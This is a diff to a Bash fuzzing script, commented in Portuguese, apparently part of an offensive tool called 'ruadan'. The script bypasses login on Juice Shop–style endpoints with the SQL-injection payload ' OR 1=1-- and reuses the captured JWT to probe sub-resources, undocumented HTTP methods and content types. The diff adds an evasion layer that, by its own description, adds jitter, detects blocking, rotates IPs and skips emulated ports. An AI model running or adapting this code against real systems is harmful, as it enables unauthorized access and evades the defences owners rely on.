@@ -12,6 +12,10 @@
 #   3. Testa métodos não documentados (PUT/DELETE/PATCH em GET endpoints)
 #   4. Testa Content-Types alternativos (XML, form-data, plain text)
 # Emite: RECURSIVE_FINDING: <tipo> <endpoint> <detalhe>
+#
+# EVASÃO (evasion_lib.sh): budget global, jitter, detecção de bloqueio com
+# rotação de IP, 1 request onde antes eram 2, orçamento de tempo por porta,
+# pula portas emuladas, aborto gracioso. enabled=0 → padrão idêntico.
 # ==============================================================================
 set -u
 
@@ -20,18 +24,28 @@ PORT="${2:-80}"
 SCHEME="${3:-http}"
 CURL_OPTS="-sk --max-time 15"
 
+# ---- Camada de evasão -----------------------------------------------------------
+_EV_LIB="$(dirname "${BASH_SOURCE[0]}")/evasion_lib.sh"
+[ -f "$_EV_LIB" ] || _EV_LIB="/ruadan/evasion_lib.sh"
+. "$_EV_LIB"
+ev_init "$TARGET" "$PORT" "$SCHEME"
+ev_skip_port && exit 0
+ev_should_abort && exit 0
+
 BASE_URL="${SCHEME}://${TARGET}:${PORT}"
 if [ "$SCHEME" = "http" ]; then
-    _redir=$(curl $CURL_OPTS -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
+    _redir=$(curl $CURL_OPTS ${EV__IDA[@]+"${EV__IDA[@]}"} -o /dev/null -w "%{redirect_url}" "${BASE_URL}/" 2>/dev/null)
     if [ -n "$_redir" ] && [[ "$_redir" == https* ]]; then
         BASE_URL="${_redir%/}"
     fi
 fi
+ev_set_probe_url "${BASE_URL}/"
 echo "[recursive-fuzz] Alvo: ${BASE_URL}"
 
 # Captura JWT
 LOGIN_BODY='{"email":"'"'"' OR 1=1--","password":"x"}'
-LOGIN_RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY" 2>/dev/null)
+ev_body $CURL_OPTS -X POST "${BASE_URL}/rest/user/login" -H "Content-Type: application/json" -d "$LOGIN_BODY"
+LOGIN_RESP="$EV_BODY"
 JWT=$(echo "$LOGIN_RESP" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"$//' | head -1)
 AUTH=""
 [ -n "$JWT" ] && AUTH="Authorization: Bearer ${JWT}"
@@ -53,16 +67,19 @@ ROOT_ENDPOINTS=(
 SUB_RESOURCES=("" "/1" "/2" "/3" "/search" "/list" "/all" "/count" "/admin" "/debug" "/config" "/schema" "/_search" "/bulk")
 
 for ROOT in "${ROOT_ENDPOINTS[@]}"; do
+    ev_should_abort && exit 0
     # Verifica se o endpoint raiz responde
-    ROOT_CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${ROOT}" 2>/dev/null)
+    ev_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${ROOT}"
+    ROOT_CODE="$EV_CODE"
     [ "$ROOT_CODE" != "200" ] && [ "$ROOT_CODE" != "500" ] && continue
 
     echo "[recursive-fuzz] Expandindo ${ROOT} (HTTP ${ROOT_CODE})..."
 
     for SUB in "${SUB_RESOURCES[@]}"; do
+        ev_should_abort && exit 0
         EP="${ROOT}${SUB}"
-        CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
-        SIZE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{size_download}" "${BASE_URL}${EP}" 2>/dev/null)
+        ev_code_size $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}"
+        CODE="$EV_CODE"; SIZE="$EV_SIZE"
 
         if [ "$CODE" = "200" ] && [ "$SIZE" -gt 50 ]; then
             echo "RECURSIVE_FINDING: GET ${EP} (HTTP ${CODE}, ${SIZE}B) — sub-recurso acessível"
@@ -80,10 +97,14 @@ echo "[recursive-fuzz] Testando métodos não documentados..."
 METHODS=("PUT" "DELETE" "PATCH" "HEAD" "OPTIONS")
 
 for EP in "${ROOT_ENDPOINTS[@]}"; do
-    GET_CODE=$(curl $CURL_OPTS -H "$AUTH" -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
+    ev_should_abort && exit 0
+    ev_code $CURL_OPTS -H "$AUTH" "${BASE_URL}${EP}"
+    GET_CODE="$EV_CODE"
     for METHOD in "${METHODS[@]}"; do
-        M_CODE=$(curl $CURL_OPTS -X "$METHOD" -H "$AUTH" -H "Content-Type: application/json" \
-            -d '{"test":"ruadan"}' -o /dev/null -w "%{http_code}" "${BASE_URL}${EP}" 2>/dev/null)
+        ev_should_abort && exit 0
+        ev_code $CURL_OPTS -X "$METHOD" -H "$AUTH" -H "Content-Type: application/json" \
+            -d '{"test":"ruadan"}' "${BASE_URL}${EP}"
+        M_CODE="$EV_CODE"
         # Se o método é aceito (não 405 Method Not Allowed) e difere de GET
         if [ "$M_CODE" != "405" ] && [ "$M_CODE" != "404" ] && [ "$M_CODE" != "501" ]; then
             if [ "$M_CODE" != "$GET_CODE" ] || [ "$METHOD" = "DELETE" ] || [ "$METHOD" = "PUT" ]; then
@@ -105,9 +126,11 @@ CONTENT_TYPES=(
 )
 
 for EP in "/rest/user/login" "/api/Users" "/rest/save/review"; do
+    ev_should_abort && exit 0
     for CT in "${CONTENT_TYPES[@]}"; do
-        RESP=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test" 2>/dev/null)
-        CODE=$(curl $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test" -o /dev/null -w "%{http_code}" 2>/dev/null)
+        ev_should_abort && exit 0
+        ev_body_and_code $CURL_OPTS -X POST "${BASE_URL}${EP}" -H "Content-Type: ${CT}" -d "email=test&password=test"
+        CODE="$EV_CODE"
         if [ "$CODE" = "200" ]; then
             echo "RECURSIVE_FINDING: CONTENT_TYPE ${CT} em ${EP} — aceito (HTTP ${CODE})"
             VULN_COUNT=$((VULN_COUNT+1))
